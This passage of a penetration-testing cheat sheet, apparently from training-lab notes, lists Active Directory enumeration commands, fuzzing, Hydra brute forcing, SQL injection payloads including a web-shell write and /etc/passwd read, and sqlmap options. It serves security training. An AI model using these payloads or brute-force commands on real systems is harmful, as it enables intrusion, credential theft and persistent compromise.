<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td>
<td>Authenticates with a Windows target over <code>smb</code> using
valid credentials and utilizes the CrackMapExec module (<code>-M</code>)
<code>spider_plus</code> to go through each readable share
(<code>Dev-share</code>) and list all readable files. The results are
outputted in <code>JSON</code>. Performed from a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td>
<td>Enumerates the target Windows domain using valid credentials and
lists shares &amp; permissions available on each within the context of
the valid credentials used and the target Windows host
(<code>-H</code>). Performed from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td>
<td>Enumerates the target Windows domain using valid credentials and
performs a recursive listing (<code>-R</code>) of the specified share
(<code>SYSVOL</code>) and only outputs a list of directories
(<code>--dir-only</code>) in the share. Performed from a Linux-based
host.</td>
</tr>
<tr class="odd">
<td><code>rpcclient $&gt; queryuser 0x457</code></td>
<td>Enumerates a target user account in a Windows domain using its
relative identifier (<code>0x457</code>). Performed from a Linux-based
host.</td>
</tr>
<tr class="even">
<td><code>rpcclient $&gt; enumdomusers</code></td>
<td>Discovers user accounts in a target Windows domain and their
associated relative identifiers (<code>rid</code>). Performed from a
Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code></td>
<td>Impacket tool used to connect to the <code>CLI</code> of a Windows
target via the <code>ADMIN$</code> administrative share with valid
credentials. Performed from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code></td>
<td>Impacket tool used to connect to the <code>CLI</code> of a Windows
target via <code>WMI</code> with valid credentials. Performed from a
Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>windapsearch.py -h</code></td>
<td>Used to display the options and functionality of windapsearch.py.
Performed from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da</code></td>
<td>Used to enumerate the domain admins group (<code>--da</code>) using
a valid set of credentials on a target Windows domain. Performed from a
Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU</code></td>
<td>Used to perform a recursive search (<code>-PU</code>) for users with
nested permissions using valid credentials. Performed from a Linux-based
host.</td>
</tr>
<tr class="even">
<td><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></td>
<td>Executes the python implementation of BloodHound
(<code>bloodhound.py</code>) with valid credentials and specifies a name
server (<code>-ns</code>) and target Windows domain
(<code>inlanefreight.local</code>) as well as runs all checks
(<code>-c all</code>). Runs using valid credentials. Performed from a
Linux-based host.</td>
</tr>
</tbody>
</table>
<h4 id="enumeration-by-living-off-the-land">Enumeration by Living Off
the Land</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Get-Module</code></td>
<td>PowerShell cmd-let used to list all available modules, their version
and command options from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Import-Module ActiveDirectory</code></td>
<td>Loads the <code>Active Directory</code> PowerShell module from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-ADDomain</code></td>
<td>PowerShell cmd-let used to gather Windows domain information from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td>
<td>PowerShell cmd-let used to enumerate user accounts on a target
Windows domain and filter by <code>ServicePrincipalName</code>.
Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-ADTrust -Filter *</code></td>
<td>PowerShell cmd-let used to enumerate any trust relationships in a
target Windows domain and filters by any (<code>-Filter *</code>).
Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-ADGroup -Filter * \| select name</code></td>
<td>PowerShell cmd-let used to enumerate groups in a target Windows
domain and filters by the name of the group (<code>select name</code>).
Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-ADGroup -Identity "Backup Operators"</code></td>
<td>PowerShell cmd-let used to search for a specifc group
(<code>-Identity "Backup Operators"</code>). Performed from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-ADGroupMember -Identity "Backup Operators"</code></td>
<td>PowerShell cmd-let used to discover the members of a specific group
(<code>-Identity "Backup Operators"</code>). Performed from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Export-PowerViewCSV</code></td>
<td>PowerView script used to append results to a <code>CSV</code> file.
Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>ConvertTo-SID</code></td>
<td>PowerView script used to convert a <code>User</code> or
<code>Group</code> name to it’s <code>SID</code>. Performed from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainSPNTicket</code></td>
<td>PowerView script used to request the kerberos ticket for a specified
service principal name (<code>SPN</code>). Performed from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-Domain</code></td>
<td>PowerView script used tol return the AD object for the current (or
specified) domain. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainController</code></td>
<td>PowerView script used to return a list of the target domain
controllers for the specified target domain. Performed from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainUser</code></td>
<td>PowerView script used to return all users or specific user objects
in AD. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainComputer</code></td>
<td>PowerView script used to return all computers or specific computer
objects in AD. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainGroup</code></td>
<td>PowerView script used to eturn all groups or specific group objects
in AD. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainOU</code></td>
<td>PowerView script used to search for all or specific OU objects in
AD. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Find-InterestingDomainAcl</code></td>
<td>PowerView script used to find object <code>ACLs</code> in the domain
with modification rights set to non-built in objects. Performed from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainGroupMember</code></td>
<td>PowerView script used to return the members of a specific domain
group. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainFileServer</code></td>
<td>PowerView script used to return a list of servers likely functioning
as file servers. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainDFSShare</code></td>
<td>PowerView script used to return a list of all distributed file
systems for the current (or specified) domain. Performed from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainGPO</code></td>
<td>PowerView script used to return all GPOs or specific GPO objects in
AD. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainPolicy</code></td>
<td>PowerView script used to return the default domain policy or the
domain controller policy for the current domain. Performed from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-NetLocalGroup</code></td>
<td>PowerView script used to enumerate local groups on a local or remote
machine. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-NetLocalGroupMember</code></td>
<td>PowerView script enumerate members of a specific local group.
Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-NetShare</code></td>
<td>PowerView script used to return a list of open shares on a local (or
a remote) machine. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-NetSession</code></td>
<td>PowerView script used to return session information for the local
(or a remote) machine. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Test-AdminAccess</code></td>
<td>PowerView script used to test if the current user has administrative
access to the local (or a remote) machine. Performed from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Find-DomainUserLocation</code></td>
<td>PowerView script used to find machines where specific users are
logged into. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Find-DomainShare</code></td>
<td>PowerView script used to find reachable shares on domain machines.
Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Find-InterestingDomainShareFile</code></td>
<td>PowerView script that searches for files matching specific criteria
on readable shares in the domain. Performed from a Windows-based
host.</td>
</tr>
<tr class="even">
<td><code>Find-LocalAdminAccess</code></td>
<td>PowerView script used to find machines on the local domain where the
current user has local administrator access Performed from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainTrust</code></td>
<td>PowerView script that returns domain trusts for the current domain
or a specified domain. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-ForestTrust</code></td>
<td>PowerView script that returns all forest trusts for the current
forest or a specified forest. Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainForeignUser</code></td>
<td>PowerView script that enumerates users who are in groups outside of
the user’s domain. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainForeignGroupMember</code></td>
<td>PowerView script that enumerates groups with users outside of the
group’s domain and returns each foreign member. Performed from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainTrustMapping</code></td>
<td>PowerView script that enumerates all trusts for current domain and
any others seen. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td>
<td>PowerView script used to list all the members of a target group
(<code>"Domain Admins"</code>) through the use of the recurse option
(<code>-Recurse</code>). Performed from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td>
<td>PowerView script used to find users on the target Windows domain
that have the <code>Service Principal Name</code> set. Performed from a
Windows-based host.</td>
</tr>
<tr class="even">
<td><code>.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></td>
<td>Runs a tool called <code>Snaffler</code> against a target Windows
domain that finds various kinds of data in shares that the compromised
account has access to. Performed from a Windows-based host.</td>
</tr>
</tbody>
</table>
<p><a id="web-exploitation"></a> ## Web Exploitation</p>
<p><a id="14-using-web-proxies"></a> ### 14. Using Web Proxies #### Burp
Shortcuts</p>
<table>
<thead>
<tr class="header">
<th><strong>Shortcut</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>[<code>CTRL+R</code>]</td>
<td>Send to repeater</td>
</tr>
<tr class="even">
<td>[<code>CTRL+SHIFT+R</code>]</td>
<td>Go to repeater</td>
</tr>
<tr class="odd">
<td>[<code>CTRL+I</code>]</td>
<td>Send to intruder</td>
</tr>
<tr class="even">
<td>[<code>CTRL+SHIFT+B</code>]</td>
<td>Go to intruder</td>
</tr>
<tr class="odd">
<td>[<code>CTRL+U</code>]</td>
<td>URL encode</td>
</tr>
<tr class="even">
<td>[<code>CTRL+SHIFT+U</code>]</td>
<td>URL decode</td>
</tr>
</tbody>
</table>
<h4 id="zap-shortcuts">ZAP Shortcuts</h4>
<table>
<thead>
<tr class="header">
<th><strong>Shortcut</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>[<code>CTRL+B</code>]</td>
<td>Toggle intercept on/off</td>
</tr>
<tr class="even">
<td>[<code>CTRL+R</code>]</td>
<td>Go to replacer</td>
</tr>
<tr class="odd">
<td>[<code>CTRL+E</code>]</td>
<td>Go to encode/decode/hash</td>
</tr>
</tbody>
</table>
<h4 id="firefox-shortcuts">Firefox Shortcuts</h4>
<table>
<thead>
<tr class="header">
<th><strong>Shortcut</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>[<code>CTRL+SHIFT+R</code>]</td>
<td>Force Refresh Page</td>
</tr>
</tbody>
</table>
<p><a id="15-attacking-web-applications-with-ffuf"></a> ### 15.
Attacking Web Applications with Ffuf</p>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ffuf -h</code></td>
<td>ffuf help</td>
</tr>
<tr class="even">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></td>
<td>Directory Fuzzing</td>
</tr>
<tr class="odd">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code></td>
<td>Extension Fuzzing</td>
</tr>
<tr class="even">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></td>
<td>Page Fuzzing</td>
</tr>
<tr class="odd">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></td>
<td>Recursive Fuzzing</td>
</tr>
<tr class="even">
<td><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code></td>
<td>Sub-domain Fuzzing</td>
</tr>
<tr class="odd">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code></td>
<td>VHost Fuzzing</td>
</tr>
<tr class="even">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></td>
<td>Parameter Fuzzing - GET</td>
</tr>
<tr class="odd">
<td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code></td>
<td>Parameter Fuzzing - POST</td>
</tr>
<tr class="even">
<td><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code></td>
<td>Value Fuzzing</td>
</tr>
</tbody>
</table>
<h4 id="wordlists">Wordlists</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td>
<td>Directory/Page Wordlist</td>
</tr>
<tr class="even">
<td><code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code></td>
<td>Extensions Wordlist</td>
</tr>
<tr class="odd">
<td><code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>
<td>Domain Wordlist</td>
</tr>
<tr class="even">
<td><code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code></td>
<td>Parameters Wordlist</td>
</tr>
</tbody>
</table>
<h4 id="misc">Misc</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>sudo sh -c 'echo "SERVER_IP  academy.htb" &gt;&gt; /etc/hosts'</code></td>
<td>Add DNS entry</td>
</tr>
<tr class="even">
<td><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code></td>
<td>Create Sequence Wordlist</td>
</tr>
<tr class="odd">
<td><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code></td>
<td>curl w/ POST</td>
</tr>
</tbody>
</table>
<p><a id="16-login-brute-forcing"></a> ### 16. Login Brute Forcing</p>
<h4 id="hydra">Hydra</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>hydra -h</code></td>
<td>hydra help</td>
</tr>
<tr class="even">
<td><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td>
<td>Basic Auth Brute Force - Combined Wordlist</td>
</tr>
<tr class="odd">
<td><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td>
<td>Basic Auth Brute Force - User/Pass Wordlists</td>
</tr>
<tr class="even">
<td><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'"</code></td>
<td>Login Form Brute Force - Static User, Pass Wordlist</td>
</tr>
<tr class="odd">
<td><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td>
<td>SSH Brute Force - User/Pass Wordlists</td>
</tr>
<tr class="even">
<td><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td>
<td>FTP Brute Force - Static User, Pass Wordlist</td>
</tr>
</tbody>
</table>
<h4 id="wordlists-1">Wordlists</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td>
<td>Default Passwords Wordlist</td>
</tr>
<tr class="even">
<td><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td>
<td>Common Passwords Wordlist</td>
</tr>
<tr class="odd">
<td><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td>
<td>Common Names Wordlist</td>
</tr>
</tbody>
</table>
<h4 id="misc-1">Misc</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>cupp -i</code></td>
<td>Creating Custom Password Wordlist</td>
</tr>
<tr class="even">
<td><code>sed -ri '/^.{,7}$/d' william.txt</code></td>
<td>Remove Passwords Shorter Than 8</td>
</tr>
<tr class="odd">
<td><code>sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt</code></td>
<td>Remove Passwords With No Special Chars</td>
</tr>
<tr class="even">
<td><code>sed -ri '/[0-9]+/!d' william.txt</code></td>
<td>Remove Passwords With No Numbers</td>
</tr>
<tr class="odd">
<td><code>./username-anarchy Bill Gates &gt; bill.txt</code></td>
<td>Generate Usernames List</td>
</tr>
<tr class="even">
<td><code>ssh b.gates@SERVER_IP -p PORT</code></td>
<td>SSH to Server</td>
</tr>
<tr class="odd">
<td><code>ftp 127.0.0.1</code></td>
<td>FTP to Server</td>
</tr>
<tr class="even">
<td><code>su - user</code></td>
<td>Switch to User</td>
</tr>
</tbody>
</table>
<p><a id="17-sql-injection-fundamentals"></a> ### 17. SQL Injection
Fundamentals</p>
<h4 id="mysql-1">MySQL</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>General</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
<td>login to mysql database</td>
</tr>
<tr class="odd">
<td><code>SHOW DATABASES</code></td>
<td>List available databases</td>
</tr>
<tr class="even">
<td><code>USE users</code></td>
<td>Switch to database</td>
</tr>
<tr class="odd">
<td><strong>Tables</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>CREATE TABLE logins (id INT, ...)</code></td>
<td>Add a new table</td>
</tr>
<tr class="odd">
<td><code>SHOW TABLES</code></td>
<td>List available tables in current database</td>
</tr>
<tr class="even">
<td><code>DESCRIBE logins</code></td>
<td>Show table properties and columns</td>
</tr>
<tr class="odd">
<td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
<td>Add values to table</td>
</tr>
<tr class="even">
<td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
<td>Add values to specific columns in a table</td>
</tr>
<tr class="odd">
<td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
<td>Update table values</td>
</tr>
<tr class="even">
<td><strong>Columns</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>SELECT * FROM table_name</code></td>
<td>Show all columns in a table</td>
</tr>
<tr class="even">
<td><code>SELECT column1, column2 FROM table_name</code></td>
<td>Show specific columns in a table</td>
</tr>
<tr class="odd">
<td><code>DROP TABLE logins</code></td>
<td>Delete a table</td>
</tr>
<tr class="even">
<td><code>ALTER TABLE logins ADD newColumn INT</code></td>
<td>Add new column</td>
</tr>
<tr class="odd">
<td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
<td>Rename column</td>
</tr>
<tr class="even">
<td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
<td>Change column datatype</td>
</tr>
<tr class="odd">
<td><code>ALTER TABLE logins DROP oldColumn</code></td>
<td>Delete column</td>
</tr>
<tr class="even">
<td><strong>Output</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>SELECT * FROM logins ORDER BY column_1</code></td>
<td>Sort by column</td>
</tr>
<tr class="even">
<td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
<td>Sort by column in descending order</td>
</tr>
<tr class="odd">
<td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
<td>Sort by two-columns</td>
</tr>
<tr class="even">
<td><code>SELECT * FROM logins LIMIT 2</code></td>
<td>Only show first two results</td>
</tr>
<tr class="odd">
<td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
<td>Only show first two results starting from index 2</td>
</tr>
<tr class="even">
<td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td>
<td>List results that meet a condition</td>
</tr>
<tr class="odd">
<td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td>
<td>List results where the name is similar to a given string</td>
</tr>
</tbody>
</table>
<h4 id="mysql-operator-precedence">MySQL Operator Precedence</h4>
<ul>
<li>Division (<code>/</code>), Multiplication (<code>*</code>), and
Modulus (<code>%</code>)</li>
<li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li>
<li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>,
<code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>,
<code>LIKE</code>)</li>
<li>NOT (<code>!</code>)</li>
<li>AND (<code>&amp;&amp;</code>)</li>
<li>OR (<code>||</code>)</li>
</ul>
<h4 id="sql-injection">SQL Injection</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Payload</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Auth Bypass</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>admin' or '1'='1</code></td>
<td>Basic Auth Bypass</td>
</tr>
<tr class="odd">
<td><code>admin')-- -</code></td>
<td>Basic Auth Bypass With comments</td>
</tr>
<tr class="even">
<td><a
href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth
Bypass Payloads</a></td>
<td></td>
</tr>
<tr class="odd">
<td><strong>Union Injection</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>' order by 1-- -</code></td>
<td>Detect number of columns using <code>order by</code></td>
</tr>
<tr class="odd">
<td><code>cn' UNION select 1,2,3-- -</code></td>
<td>Detect number of columns using Union injection</td>
</tr>
<tr class="even">
<td><code>cn' UNION select 1,@@version,3,4-- -</code></td>
<td>Basic Union injection</td>
</tr>
<tr class="odd">
<td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
<td>Union injection for 4 columns</td>
</tr>
<tr class="even">
<td><strong>DB Enumeration</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>SELECT @@version</code></td>
<td>Fingerprint MySQL with query output</td>
</tr>
<tr class="even">
<td><code>SELECT SLEEP(5)</code></td>
<td>Fingerprint MySQL with no output</td>
</tr>
<tr class="odd">
<td><code>cn' UNION select 1,database(),2,3-- -</code></td>
<td>Current database name</td>
</tr>
<tr class="even">
<td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
<td>List all databases</td>
</tr>
<tr class="odd">
<td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td>
<td>List all tables in a specific database</td>
</tr>
<tr class="even">
<td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td>
<td>List all columns in a specific table</td>
</tr>
<tr class="odd">
<td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
<td>Dump data from a table in another database</td>
</tr>
<tr class="even">
<td><strong>Privileges</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td>
<td>Find current user</td>
</tr>
<tr class="even">
<td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td>
<td>Find if user has admin privileges</td>
</tr>
<tr class="odd">
<td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -</code></td>
<td>Find if all user privileges</td>
</tr>
<tr class="even">
<td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td>
<td>Find which directories can be accessed through MySQL</td>
</tr>
<tr class="odd">
<td><strong>File Injection</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td>
<td>Read local file</td>
</tr>
<tr class="odd">
<td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td>
<td>Write a string to a local file</td>
</tr>
<tr class="even">
<td><code>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</code></td>
<td>Write a web shell into the base web directory</td>
</tr>
</tbody>
</table>
<p><a id="18-sqlmap-essentials"></a> ### 18. SQLMap Essentials</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 49%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>sqlmap -h</code></td>
<td>View the basic help menu</td>
</tr>
<tr class="even">
<td><code>sqlmap -hh</code></td>
<td>View the advanced help menu</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/vuln.php?id=1" --batch</code></td>
<td>Run <code>SQLMap</code> without asking for user input</td>
</tr>
<tr class="even">
<td><code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code></td>
<td><code>SQLMap</code> with POST request</td>
</tr>
<tr class="odd">
<td><code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code></td>
<td>POST request specifying an injection point with an asterisk</td>
</tr>
<tr class="even">
<td><code>sqlmap -r req.txt</code></td>
<td>Passing an HTTP request file to <code>SQLMap</code></td>
</tr>
<tr class="odd">
<td><code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td>
<td>Specifying a cookie header</td>
</tr>
<tr class="even">
<td><code>sqlmap -u www.target.com --data='id=1' --method PUT</code></td>
<td>Specifying a PUT request</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt</code></td>
<td>Store traffic to an output file</td>
</tr>
<tr class="even">
<td><code>sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch</code></td>
<td>Specify verbosity level</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</code></td>
<td>Specifying a prefix or suffix</td>
</tr>
<tr class="even">
<td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td>
<td>Specifying the level and risk</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</code></td>
<td>Basic DB enumeration</td>
</tr>
<tr class="even">
<td><code>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</code></td>
<td>Table enumeration</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</code></td>
<td>Table/row enumeration</td>
</tr>
<tr class="even">
<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></td>
<td>Conditional enumeration</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/?id=1" --schema</code></td>
<td>Database schema enumeration</td>
</tr>
<tr class="even">
<td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td>
<td>Searching for data</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</code></td>
<td>Password enumeration and cracking</td>
</tr>
<tr class="even">
<td><code>sqlmap -u "http://www.example.com/" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></td>
<td>Anti-CSRF token bypass</td>
</tr>
<tr class="odd">
<td><code>sqlmap --list-tampers</code></td>
<td>List all tamper scripts</td>
</tr>
